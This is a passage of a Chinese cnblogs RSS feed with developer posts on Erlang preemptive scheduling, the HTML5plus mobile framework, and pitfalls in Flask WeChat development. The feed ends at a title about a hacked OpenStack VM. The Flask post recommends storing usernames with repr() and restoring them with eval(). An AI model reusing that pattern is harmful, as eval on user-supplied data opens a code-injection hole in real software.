&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;erlang:statistics(&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;run_queue&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;).&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;%% =&amp;gt; 8&lt;/span&gt;

&lt;span class=&quot;co&quot;&gt;%% Erlang is still responsive, great!&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;calc:prime_numbers(&lt;/span&gt;&lt;span class=&quot;dv&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;).&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;%% =&amp;gt; [2, 3, 5, 7]&lt;/span&gt;

&lt;span class=&quot;co&quot;&gt;%% Wait a moment&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;erlang:statistics(&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;run_queue&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;).&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;%% =&amp;gt; 4&lt;/span&gt;

&lt;span class=&quot;co&quot;&gt;%% Wait a moment&lt;/span&gt;
&lt;span class=&quot;kw&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;fu&quot;&gt;erlang:statistics(&lt;/span&gt;&lt;span class=&quot;ch&quot;&gt;run_queue&lt;/span&gt;&lt;span class=&quot;fu&quot;&gt;).&lt;/span&gt; &lt;span class=&quot;co&quot;&gt;%% =&amp;gt; 0&lt;/span&gt;&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;因为并发process比online调度线程多，调度器会花上较多时间执行所有process直到&lt;strong&gt;run queue&lt;/strong&gt;为空。有趣的是在spawn这些CPU密集process后，由于抢占式调度，erlang模拟器一直保持响应。它不会让这些流氓process消耗所有运行时，而让其它可能轻量级但很重要的process饿死，这对于实时系统来说是非常棒的一个特性。&lt;/p&gt;
&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
&lt;p&gt;虽然实现一个抢占式调度系统很复杂，但万幸这不是开发者的事，它内置于erlang虚拟机。另一方面，对于一个所有process资源需要相对公平，响应时间不能太长的实时系统来说，额外的跟踪，平衡，选择，抢占线程的成本是完全可以接受的。还有，完全抢占调度需要操作系统的支持，但就平台或者库的角度上，&lt;strong&gt;Erlang虚拟机&lt;/strong&gt;可以说是最独特的那个：JVM线程依赖于操作系统调度器，&lt;a href=&quot;http://actor-framework.org/&quot;&gt;CAF&lt;/a&gt;,一个基于actor模型的C++库，使用协作式调度。Golang不是完全抢占式，Python的Twisted也不是，Ruby的event machine和nodejs同样也不是。这不是说erlang总是最好的选择，只是对于要求低延时的实时平台Erlang是一个好的选择&lt;/p&gt;
&lt;h2 id=&quot;其他&quot;&gt;其他&lt;/h2&gt;
</description>
<pubDate>Wed, 07 Feb 2018 10:59:00 +0000</pubDate>
<dc:creator>racaljk</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/racaljk/p/8428050.html</dc:identifier>
</item>
<item>
<title>浅谈 HTML5plus 开发移动应用 - 代码实习生</title>
<link>http://www.cnblogs.com/xiaoyucoding/p/8427802.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xiaoyucoding/p/8427802.html</guid>
<description>&lt;h2 id=&quot;什么是-html5plus&quot;&gt;什么是 HTML5plus&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;http://www.dcloud.io/&quot;&gt;DCloud&lt;/a&gt; 公司提供的，使用传统 web 技术开发移动应用的解决方案。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;增强版的手机浏览器引擎，让HTML5达到原生水平！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;产品口号，总会有些夸张的成分，不要在意这些细节。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Tips&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;HTML5plus 名字太长，因而又称 HTML5+，或简称 5+。&lt;/li&gt;
&lt;li&gt;使用该引擎开发的移动应用，又称 5+App。&lt;/li&gt;
&lt;li&gt;相关的 SDK，称为 5+SDK。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;使用方式&quot;&gt;使用方式&lt;/h2&gt;
&lt;h3 id=&quot;runtime&quot;&gt;Runtime&lt;/h3&gt;
&lt;p&gt;即使用 DCloud 公司的另一款产品 HBuilder，直接进行开发调试。&lt;/p&gt;
&lt;h3 id=&quot;sdk&quot;&gt;SDK&lt;/h3&gt;
&lt;p&gt;将 5+SDK 集成到自己的原生应用中，就可以在应用中使用其扩展的 JS API。&lt;/p&gt;
&lt;h3 id=&quot;区别&quot;&gt;区别&lt;/h3&gt;
&lt;ul&gt;&lt;li&gt;Runtime 方式可以直接使用 DCloud 提供的云端打包，不需要本地搭建打包环境。&lt;/li&gt;
&lt;li&gt;Runtime 方式无需掌握原生开发的能力，合理使用扩展的 API 即可。&lt;/li&gt;
&lt;li&gt;SDK 方式可以满足更多的需求，但是需要掌握原生开发的能力。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;简单地理解下&lt;br/&gt;Runtime 方式，不需要开发者自己开发原生应用的基座部分，5+ 这边帮开发者做好了，只需要提交应用资源云端打包就行了。&lt;br/&gt;SDK 方式则不同，这种情况是在原有的原生应用基座基础上，扩展 5+SDK。因而，需要开发者自己搭建原生开发的环境，进行部分原生开发的工作。&lt;/p&gt;
&lt;h2 id=&quot;基本架构&quot;&gt;基本架构&lt;/h2&gt;
&lt;p&gt;按照官方的文档说明 &lt;a href=&quot;http://ask.dcloud.net.cn/article/66&quot;&gt;Android平台第三方插件开发指导&lt;/a&gt;，大体分为三层结构。这里为了更方便理解，扩展成四部分进行说明。&lt;/p&gt;
&lt;h3 id=&quot;webview&quot;&gt;Webview&lt;/h3&gt;
&lt;p&gt;可以理解为简单的浏览器，HTML、CSS、JavaScript 都在这里。&lt;/p&gt;
&lt;h3 id=&quot;plus&quot;&gt;plus&lt;/h3&gt;
&lt;p&gt;这部分在 Webview 中，在原有的浏览器环境基础上，扩展可以调用原生功能的 API，这些 API 都在 &lt;code&gt;window.plus&lt;/code&gt; 这个对象里面。&lt;/p&gt;
&lt;h3 id=&quot;js-bridge&quot;&gt;JS Bridge&lt;/h3&gt;
&lt;p&gt;负责连接 JavaScript 层与 Native 层。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;接收 JavaScript 层传发过来的请求，通知 Native 层做出相应的响应。&lt;/li&gt;
&lt;li&gt;接收 Native 层响应的结果，通知 JavaScript 层接收结果。&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;native&quot;&gt;Native&lt;/h3&gt;
&lt;p&gt;即 Android 和 iOS，也是 HTML5plus 的核心关键部分。&lt;/p&gt;
&lt;h3 id=&quot;一次调用执行的过程&quot;&gt;一次调用执行的过程&lt;/h3&gt;
&lt;p&gt;以获取应用版本号为例&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;plus.runtime.version;&lt;/code&gt;
&lt;/pre&gt;
&lt;ol&gt;&lt;li&gt;JS 层调用 &lt;code&gt;plus.runtime.version&lt;/code&gt;，Webview 向 JS Bridge 发起请求。&lt;/li&gt;
&lt;li&gt;JS Bridge 接收请求，通知 Native 层读取应用版本号信息。&lt;/li&gt;
&lt;li&gt;Native 层执行拿到结果，通知 JS Bridge 层相应结果。&lt;/li&gt;
&lt;li&gt;JS Bridge 拿到 Native 层相应的结果，通知相应的 Webview 结果信息。&lt;/li&gt;
&lt;li&gt;JS 层获取到应用的版本信息。&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;吐槽一下&quot;&gt;吐槽一下&lt;/h2&gt;
&lt;p&gt;个人认为，每个产品每家公司，都有其自身的设计理念以及经营策略。不同的用户，总会有不同的需求和看法。&lt;br/&gt;因此，做技术选型时一定要搞清楚自己的需求和被调研的产品信息。DCloud 的社区中，经常出现“怎么没有XXX API”，“为什么不集成XXX SDK”，“不会原生开发，希望官方能够扩展XXX API”等等类似的帖子。至于出现此类问题的具体原因，大家都有自己的理解，这里不做讨论。&lt;br/&gt;做技术选型时，最好亲自动手做下尝试。不要期望产品供应方给你最佳答复，因为人家不会傻傻地把用户往外推。&lt;br/&gt;------华丽丽分割线------&lt;br/&gt;下面，分享一下个人使用的经验和心得，希望可以帮助其他开发者在技术选型时做个参考。&lt;/p&gt;
&lt;h2 id=&quot;优点&quot;&gt;优点&lt;/h2&gt;
&lt;ol&gt;&lt;li&gt;学习成本低，只要掌握了基本的 web 开发能力，即可上手。&lt;/li&gt;
&lt;li&gt;云端打包，不必本地搭建 Android 与 iOS 开发环境，进行打包处理。&lt;/li&gt;
&lt;li&gt;一套代码，只要做少许的兼容处理，即可编译成 Android 和 iOS 两个包。&lt;/li&gt;
&lt;li&gt;没有想到，待讨论补充吧。&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;不足&quot;&gt;不足&lt;/h2&gt;
&lt;ol&gt;&lt;li&gt;plus.ModuleName.* 提供的 API 有限，虽然有 Native.js 这一产品，但是需要掌握一定的原生开发能力。&lt;/li&gt;
&lt;li&gt;依赖手机自身的 Webview，因此在部分手机上性能并不理想。这一点，对于某些业务产品有一定的影响。&lt;/li&gt;
&lt;li&gt;接第1点，某些功能的实现，需要开发者自行集成 SDK 进行扩展。例如蓝牙、应用后台常驻等。这一点，同样需要开发者具有原生开发的能力。&lt;/li&gt;
&lt;li&gt;部分功能，由于兼容性问题实现的并不完善。例如桌面图标的角标等。当然，Android 的碎片化严重，有些不足可以理解。&lt;/li&gt;
&lt;li&gt;文档内容，有些地方解释地不够清楚。另外，文档的排版有点奇怪。&lt;/li&gt;
&lt;li&gt;目前没遇到其它坑了，也可能在下还不够熟悉。&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;较合适范围&quot;&gt;较合适范围&lt;/h2&gt;
&lt;p&gt;综合官方的案例展示，以及个人开发的经历。总结下来，5+App 开发比较适合以下情况或产品：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;初创公司，需要快速上线应用。&lt;/li&gt;
&lt;li&gt;新闻资讯（36Kr）、电商（HiMall）、内容分享（枫桥居花卉）、外卖等大部分的 O2O 业务产品等等。&lt;/li&gt;
&lt;li&gt;核心业务功能不依赖某些原生功能&lt;/li&gt;
&lt;li&gt;一部分企业应用，也可以根据具体需求情况而定。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;不推荐情况&quot;&gt;不推荐情况&lt;/h2&gt;
&lt;p&gt;有些情况没办法一概而论，因而按照具体情形说明。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;重度依赖某些原生功能，比如应用中需要实现地图自定义的绘线、需要蓝牙模块进行数据的通信等等。&lt;/li&gt;
&lt;li&gt;核心业务涉及到即时通信（IM），并且不希望使用第三方的 JS 版 SDK 的。&lt;/li&gt;
&lt;li&gt;需要读写文件，比如录制短视频、编辑图片、编辑视频等。&lt;/li&gt;
&lt;li&gt;某些较为“流氓”的功能，比如应用后台常驻、推送服务常驻等等。&lt;/li&gt;
&lt;li&gt;控制应用的权限，比如禁止截屏之类的。这个只能在原生层处理，而且 Android 的兼容你懂的。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;上面许多情况都需要通过原生层的开发来解决，当然同时可以集成 5+SDK，相关的扩展 API 照用不误。&lt;/p&gt;
&lt;h2 id=&quot;同类产品&quot;&gt;同类产品&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;cordova&lt;/li&gt;
&lt;li&gt;apicloud&lt;/li&gt;
&lt;li&gt;appcan&lt;/li&gt;
&lt;li&gt;ionic&lt;/li&gt;
&lt;li&gt;weex&lt;/li&gt;
&lt;li&gt;react native&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;目前在下了解到的就这些，有些产品浅尝辄止，有些产品压根就没体验过，因此这里不做对比以及过多的评述。&lt;/p&gt;
&lt;h2 id=&quot;多说两句&quot;&gt;多说两句&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;HBuilder 是一款 IDE，也是真机调试时基座的名字。这两个加起来，就是开发 5+App 的环境及工具。&lt;/li&gt;
&lt;li&gt;HTML5plus 的名字很多，DCloud 官网上写的是 5+Runtime。负责扩展 JS API，实现 JS 调用原生功能。&lt;/li&gt;
&lt;li&gt;MUI 移动开发的 UI 框架，为了方便开发封装了几个涉及到 HTML5plus 的方法，经常被人误解。但它真的只是个 UI 框架，原生能力的调用和它没关系。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;写在最后&quot;&gt;写在最后&lt;/h2&gt;
&lt;p&gt;入行三年，从事 5+App 开发的时间算起来也有近两年。以此为开始，后续会陆续分享一些在这方面的经验和心得。&lt;/p&gt;
</description>
<pubDate>Wed, 07 Feb 2018 09:53:00 +0000</pubDate>
<dc:creator>代码实习生</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xiaoyucoding/p/8427802.html</dc:identifier>
</item>
<item>
<title>细数Python Flask微信公众号开发中遇到的那些坑 - lovesoo</title>
<link>http://www.cnblogs.com/lovesoo/p/8427697.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lovesoo/p/8427697.html</guid>
<description>&lt;p&gt;最近两三个月的时间，断断续续边学边做完成了一个微信公众号页面的开发工作。这是一个快递系统，主要功能有用户管理、寄收件地址管理、用户下单，订单管理，订单查询及一些宣传页面等。本文主要细数下开发过程中遇到的各种坑，也算是另外一种总结吧。&lt;/p&gt;
&lt;h2&gt;1. 开发语言及框架&lt;/h2&gt;
&lt;p&gt;Python + Flask + Bootstrap，数据库使用的是MySQL&lt;/p&gt;

&lt;h2&gt;2. 相关文档及Lib库&lt;/h2&gt;



&lt;p&gt;4) PDF 《FlaskWeb开发：基于Python的Web应用开发实战》&lt;/p&gt;
&lt;h2&gt;3. 那些坑&lt;/h2&gt;
&lt;h3&gt;3.1 微信&lt;/h3&gt;
&lt;h4&gt;3.1.1 微信登陆&lt;/h4&gt;
&lt;p&gt;首先你需要仔细阅读官方文档，简单来说微信登陆有如下几步：&lt;/p&gt;
&lt;p&gt;1) 生成微信认证跳转URL，注意有`snsapi_base`跟`snsapi_userinfo`两种方式，前者是静默授权只获取用户openid,后者需要用户手动同意获取用户基本信息&lt;/p&gt;
&lt;p&gt;2) 获取access_token&lt;/p&gt;
&lt;p&gt;3) 获取用户信息&lt;/p&gt;




&lt;h4&gt;3.1.2 模版消息&lt;/h4&gt;
&lt;p&gt;登陆微信公众平台 -&amp;gt; 功能 -&amp;gt; 模版消息，选择右侧模版消息接口文档 ，即可查看详细的接口文档。&lt;/p&gt;
&lt;p&gt;主要步骤如下：&lt;/p&gt;
&lt;p&gt;1）获取access_token，其中token有效期为7200s，而且微信限制了每天的调用次数，这里使用functools.lru_cache维护了一个token的内存缓存&lt;/p&gt;
&lt;p&gt;2）获取模版ID&lt;/p&gt;
&lt;p&gt;3）请求接口&lt;/p&gt;
&lt;p&gt;POST URL: https://api.weixin.qq.com/cgi-bin/message/template/send?access_token=ACCESS_TOKEN&lt;/p&gt;
&lt;p&gt;POST Data: 请求包为json&lt;/p&gt;

&lt;h3&gt;3.2 MySQL&lt;/h3&gt;
&lt;h4&gt;3.2.1 编码问题&lt;/h4&gt;
&lt;div readability=&quot;12.901960784314&quot;&gt;MySQL遇到最大的坑还是编码问题，因为涉及到获取微信用户名含有各种emoji表情的问题，需要设置字符编码为utf8mb4，具体可以参考这篇文章（&lt;a href=&quot;https://mathiasbynens.be/notes/mysql-utf8mb4&quot;&gt;https://mathiasbynens.be/notes/mysql-utf8mb4&lt;/a&gt;），然而设置成功在Flask SQLAlchemy配置app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://root@localhost:3306/test?charset=utf8mb4'后，运行报错sqlalchemy.exc.OperationalError: (_mysql_exceptions.OperationalError) (2019, &quot;Can't initialize character set utf8mb4 (path: C:\\mysql\\\\share\\charsets\\)&quot;)，解决无果。&lt;/div&gt;
&lt;p&gt;最终解决方案是：&lt;/p&gt;
&lt;p&gt;1) Flask SQLAlchemy配置app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://root@localhost:3306/test?charset=utf8'&lt;/p&gt;
&lt;p&gt;2) 微信用户名写入数据库时使用repr()方法将写入原始unicode字符，读取的时候再使用eval()进行转换&lt;/p&gt;

&lt;h4&gt;3.2.2 SQLAlchemy查询数据转换为Dict&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;for&lt;/span&gt; u &lt;span&gt;in&lt;/span&gt;&lt;span&gt; session.query(User).all():
    u &lt;/span&gt;= dict(u.&lt;span&gt;__dict__&lt;/span&gt;&lt;span&gt;)
    u.pop(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;_sa_instance_state&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;, None)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考文章：&lt;/p&gt;



&lt;h3&gt;3.4 Flask&lt;/h3&gt;
&lt;h4&gt;3.4.1 cookie相关&lt;/h4&gt;
&lt;p&gt;1) 设置cookie&lt;/p&gt;
&lt;div readability=&quot;7&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
@app.route(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;/set_cookie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; set_cookie():
    response&lt;/span&gt;=make_response(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Hello World&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;);
    response.set_cookie(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Joo&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; response
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;p&gt;2) 获取cookie&lt;/p&gt;
&lt;div readability=&quot;6&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
@app.route(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;/get_cookie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; get_cookie():
    name&lt;/span&gt;=request.cookies.get(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; name
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;p&gt;3) 删除cookie&lt;/p&gt;

&lt;p&gt;设置过期时间为0&lt;/p&gt;
&lt;div readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
@app.route(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;/del_cookie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; del_cookie():
    response&lt;/span&gt;=make_response(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;delete cookie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    response.set_cookie(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;,&lt;span&gt;''&lt;/span&gt;,expires=&lt;span&gt;0)
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; response
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;p&gt;使用delete_cookie方法&lt;/p&gt;
&lt;div readability=&quot;6.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
@app.route(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;/del_cookie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; del_cookie():
    response&lt;/span&gt;=make_response(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;delete cookie&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    response.delete_cookie(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;Name&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; response
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;

&lt;h4&gt;3.4.2 flask.make_response() 实例&lt;/h4&gt;

&lt;h4&gt;3.4.3 详细解读Jquery各Ajax函数：$.get(),$.post(),$.ajax(),$.getJSON()&lt;/h4&gt;

&lt;h4&gt;3.4.4 bootstrap对话框插件&lt;/h4&gt;

&lt;h4&gt;3.4.5 Flask flash增加link&lt;/h4&gt;

&lt;h4&gt;3.4.6 HTML颜色编码&lt;/h4&gt;

&lt;h4&gt;3.4.7 Python缓存&lt;/h4&gt;
&lt;p&gt;微信获取access_token时有效期是7200s，而且微信限制了每天的调用频率（2000次/天），所以简单使用lru_cache在内存中维护了一个token缓冲，示例代码如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;@lru_cache(None)
&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; getAccessToken():
    url &lt;/span&gt;= &lt;span&gt;'&lt;/span&gt;&lt;span&gt;https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&amp;amp;appid={0}&amp;amp;secret={1}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(app_id, app_secret)
    r &lt;/span&gt;=&lt;span&gt; requests.get(url)
    access_token &lt;/span&gt;= r.json().get(&lt;span&gt;'&lt;/span&gt;&lt;span&gt;access_token&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    time_now &lt;/span&gt;= datetime.now().strftime(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;%Y-%m-%d %H:%M:%S&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
    &lt;/span&gt;&lt;span&gt;print&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;[{0}] getAccessToken Result:\t{1}&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;.format(time_now, r.text)
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; access_token, datetime.now()


&lt;/span&gt;&lt;span&gt;def&lt;/span&gt;&lt;span&gt; getToken():
    token, t &lt;/span&gt;=&lt;span&gt; getAccessToken()
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (datetime.now() - t).seconds &amp;gt; 3600&lt;span&gt;:
        getAccessToken.cache_clear()
        token, t &lt;/span&gt;=&lt;span&gt; getAccessToken()
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; token
    &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; token
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;/p&gt;



&lt;h4&gt;3.4.8 修改Bootstrap使用国内源&lt;/h4&gt;
&lt;p&gt;由于默认Bootstrap使用的CDN是http://cdnjs.cloudflare.com，国内访问较慢，所以需要修改默认CDN为国内源。&lt;/p&gt;
&lt;p&gt;找到C:\Python27\Lib\site-packages\flask_bootstrap\__init__.py（C:\Python27 为你当前Python版本路径），在文件最后找到如下代码：&lt;/p&gt;
&lt;div readability=&quot;8.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
        bootstrap =&lt;span&gt; lwrap(
            WebCDN(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/%s/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; %&lt;span&gt;
                   BOOTSTRAP_VERSION), local)

        jquery &lt;/span&gt;=&lt;span&gt; lwrap(
            WebCDN(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;//cdnjs.cloudflare.com/ajax/libs/jquery/%s/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; %&lt;span&gt;
                   JQUERY_VERSION), local)

        html5shiv &lt;/span&gt;=&lt;span&gt; lwrap(
            WebCDN(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;//cdnjs.cloudflare.com/ajax/libs/html5shiv/%s/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; %&lt;span&gt;
                   HTML5SHIV_VERSION))

        respondjs &lt;/span&gt;=&lt;span&gt; lwrap(
            WebCDN(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;//cdnjs.cloudflare.com/ajax/libs/respond.js/%s/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; %&lt;span&gt;
                   RESPONDJS_VERSION))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;替换为国内源cdn.bootcss.com，代码如下：&lt;/p&gt;
&lt;div readability=&quot;8.5&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
        bootstrap =&lt;span&gt; lwrap(
            WebCDN(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;//cdn.bootcss.com/twitter-bootstrap/%s/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; %&lt;span&gt;
                   BOOTSTRAP_VERSION), local)

        jquery &lt;/span&gt;=&lt;span&gt; lwrap(
            WebCDN(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;//cdn.bootcss.com/jquery/%s/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; %&lt;span&gt;
                   JQUERY_VERSION), local)

        html5shiv &lt;/span&gt;=&lt;span&gt; lwrap(
            WebCDN(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;//cdn.bootcss.com/html5shiv/%s/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; %&lt;span&gt;
                   HTML5SHIV_VERSION))

        respondjs &lt;/span&gt;=&lt;span&gt; lwrap(
            WebCDN(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;//cdn.bootcss.com/respond.js/%s/&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; %&lt;span&gt;
                   RESPONDJS_VERSION))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;参考资料：&lt;/p&gt;



&lt;h4&gt;3.4.9 flask部署&lt;/h4&gt;
&lt;p&gt;flask通常在Linux上部署方式是 flask + wsgi + nginx，windows上则是flask + iis + nginx。这里实际部署的环境是Windows Server 2007，由于项目实际访问量较小的关系，最终选用简单的flask + tornado部署方式。&lt;/p&gt;
&lt;p&gt;在flask项目里原来的入口程序假设为run.py的同级目录添加tornado_server.py，内容如下：&lt;/p&gt;
&lt;div readability=&quot;8&quot;&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#&lt;/span&gt;&lt;span&gt; coding:utf-8&lt;/span&gt;
 
&lt;span&gt;from&lt;/span&gt; tornado.wsgi &lt;span&gt;import&lt;/span&gt;&lt;span&gt; WSGIContainer
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; tornado.httpserver &lt;span&gt;import&lt;/span&gt;&lt;span&gt; HTTPServer
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; tornado.ioloop &lt;span&gt;import&lt;/span&gt;&lt;span&gt; IOLoop
&lt;/span&gt;&lt;span&gt;from&lt;/span&gt; run &lt;span&gt;import&lt;/span&gt;&lt;span&gt; app
http_server &lt;/span&gt;=&lt;span&gt; HTTPServer(WSGIContainer(app))

&lt;/span&gt;&lt;span&gt;#&lt;/span&gt;&lt;span&gt; address为实际访问URL，port为端口号&lt;/span&gt;
http_server.listen(port=5000, address=&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;127.0.0.1&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
IOLoop.instance().start()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;使用python tornado_server.py即可启动。&lt;/p&gt;

&lt;p&gt;参考文档：&lt;/p&gt;



</description>
<pubDate>Wed, 07 Feb 2018 09:34:00 +0000</pubDate>
<dc:creator>lovesoo</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/lovesoo/p/8427697.html</dc:identifier>
</item>
<item>
<title>云计算---记一次黑客攻击openstack创建的虚拟机 - 姚红</title>
